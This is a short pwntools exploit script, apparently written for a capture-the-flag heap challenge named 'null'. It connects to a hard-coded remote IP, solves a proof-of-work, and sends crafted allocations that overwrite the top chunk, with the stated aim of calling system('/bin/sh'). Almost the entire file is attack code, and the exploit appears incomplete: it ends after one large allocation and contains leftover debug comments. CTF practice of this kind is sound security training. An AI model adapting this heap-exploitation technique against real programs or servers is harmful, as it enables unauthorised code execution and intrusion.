from pwn import *
import sys, time

# Test diff

context.binary = "./null"
binary = ELF("./null")
libc = ELF("./libc.so.6")
context.log_level = "debug"

if len(sys.argv) == 1:
    p = process(["./null"])#, env={"LD_PRELOAD":"./libc.so.6"})

else:
    p = remote("47.98.50.73", "5000")
    p.recv(5)
    get_pow = p.recvuntil("\n")[:-1]
    args = get_pow.split(" ")
    hc = process(args)
    hc.recvuntil("token: ")
    p.sendline(hc.recvuntil("\n")[:-1])
    hc.close()

p.sendlineafter("password: ", "i'm ready for challenge")

# 1 -> action content
# 2 -> out
# 1337 -> system("/usr/bin/id")
# syscall 231 -> sys_exit_group

def allocate(size, block):
    p.sendlineafter("Action: ", "1")
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("blocks: ", str(block))
    p.sendlineafter("(0/1): ", "1")

# exploit
# function pointer : 0x602038( args1, args2 )
# system("/bin/sh")

allocate(0x110, 0)
p.recvuntil("Input: ")
p.send("A" * 0x110)

allocate(0x110, 0)
p.recvuntil("Input: ")
p.send("A" * 0x110)

allocate(0x68, 0)
p.recvuntil("Input: ")
p.send("A" * 0x60)
time.sleep(0.5)
p.send(p64(0xdeadbeef) + p64(0x4a1))   # top-chunk overwrite

allocate(0x1000, 0)
p.recvuntil("Input: ")
p.send("A" * 0x1000) # ASDF

# offset to fastbinY[5] = 0x860

p.interactive()
